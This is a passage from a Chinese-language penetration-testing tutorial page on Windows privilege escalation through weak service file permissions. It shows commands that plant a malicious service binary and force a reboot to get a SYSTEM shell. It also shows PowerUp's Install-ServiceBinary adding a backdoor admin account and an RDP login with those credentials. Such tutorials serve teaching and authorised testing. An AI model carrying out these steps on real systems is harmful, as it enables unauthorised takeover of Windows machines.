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" width="361" height="61" class="img_ev3q"></p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">move C:\temp\Juggernaut.exe &quot;C:\Program Files\Juggernaut&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shutdown /r /t 0 /f</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121745158-73872327-8631c6c585626754f74e39c5f3082a5c.png" width="572" height="426" class="img_ev3q"></p>
<p>系统重启大约 20 秒后，就看到监听器获得了一个 SYSTEM shell！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121745676-2144745762-a4d2f9667abcedd8dd31de3aada936e0.png" width="505" height="180" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="5滥用-powerupps1-功能"><strong><div id="id5">5、滥用 PowerUp.ps1 功能</div></strong><a href="#5滥用-powerupps1-功能" class="hash-link" aria-label="5滥用-powerupps1-功能的直接链接" title="5滥用-powerupps1-功能的直接链接">​</a></h2>
<p>之前在 <a href="#id3.1">3.1 小节</a>的时候，当我们使用 PowerUp.ps1 枚举服务弱文件权限时，它显示有 AbuseFunction (滥用)字段。现在，我们可以用它来利用这个漏洞。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121745511-1176650829-68f9e6bd40a183d73b710cc7d152bd21.png" width="547" height="106" class="img_ev3q"></p>
<p>使用此 AbuseFunction 命令将创建一个恶意命令，该命令会创建一个新用户，并将该用户添加到管理员组中。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Install-ServiceBinary -ServiceName &#x27;Juggernaut&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121745256-208753972-6c26113ebec162b0cd27afd09f5e994a.png" width="982" height="136" class="img_ev3q"></p>
<p>可以看到，PowerUp 创建的 Juggernaut.exe 二进制文件将创建一个名为 <strong>John</strong> 的用户，密码为 <strong>Password123!</strong>。</p>
<p>现在，当我们检查 <code>C:\Program Files\Juggernaut</code> 目录时，就会看到 PowerUp 创建的新程序将出现在其中，而原来的程序被备份为 Juggernaut.exe.bak。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121744568-1496695436-e2b338337ddeb0e27e6a6cda79f34892.png" width="482" height="311" class="img_ev3q"></p>
<p>同样地，需要重启系统才能触发新增管理员用户的程序被执行。</p>
<p>系统重新启动后，我们回到之前的反向 shell 中，在这里可以看到用户是被创建并添加到本地管理员组的！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121746095-1765453324-cc6e968da4cd1f241ab9a4b49dcf8110.png" width="739" height="480" class="img_ev3q"></p>
<p>此时，如果很幸运发现目标系统的 RDP 服务是打开的，那我们就可以使用 xfreerdp 进行 RDP 登录，然后以“以管理员身份运行”打开 cmd，进入到具有完全权限的高完整性 shell 中。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo xfreerdp /u:john /p:&#x27;Password123!&#x27; /v:172.16.1.250 +clipboard</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121747096-368811003-f5ae7ad0c78006ecadb8763c0dea1d1c.png" width="1024" height="822" class="img_ev3q"></p>
<p>但是，如果目标没有打开 RDP 服务。此时，我们就需要通过 <a href="https://www.cnblogs.com/kqdssheng/p/18751119" target="_blank" rel="noopener noreferrer">Runas</a> 和 <a href="https://www.cnblogs.com/kqdssheng/p/18745249" target="_blank" rel="noopener noreferrer">UAC-bypass</a> 技术来获取管理员高完整性 shell。</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_DLL 劫持"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Windows 提权-服务_DLL 劫持</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱服务权限"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Windows 提权-服务_弱服务权限</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#导航" class="table-of-contents__link toc-highlight">导航</a></li><li><a href="#0前言" class="table-of-contents__link toc-highlight"><strong><div>0、前言</div></strong></a></li><li><a href="#1搜寻非标准服务" class="table-of-contents__link toc-highlight"><strong><div>1、搜寻非标准服务</div></strong></a></li><li><a href="#2搜寻服务的弱权限文件" class="table-of-contents__link toc-highlight"><strong><div>2、搜寻服务的弱权限文件</div></strong></a></li><li><a href="#3工具自动化搜寻弱服务" class="table-of-contents__link toc-highlight"><strong><div>3、工具自动化搜寻弱服务</div></strong></a></li><li><a href="#4利用服务的弱权限文件" class="table-of-contents__link toc-highlight"><strong><div>4、利用服务的弱权限文件</div></strong></a></li><li><a href="#5滥用-powerupps1-功能" class="table-of-contents__link toc-highlight"><strong><div>5、滥用 PowerUp.ps1 功能</div></strong></a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a href="https://www.cnblogs.com/kqdssheng" rel="noopener noreferrer" class="footerLogoLink_BH7S"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--light_NVdE" width="30" height="30"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--dark_xIcU" width="30" height="30"></a></div></div></div></footer></div>
</body>
</html>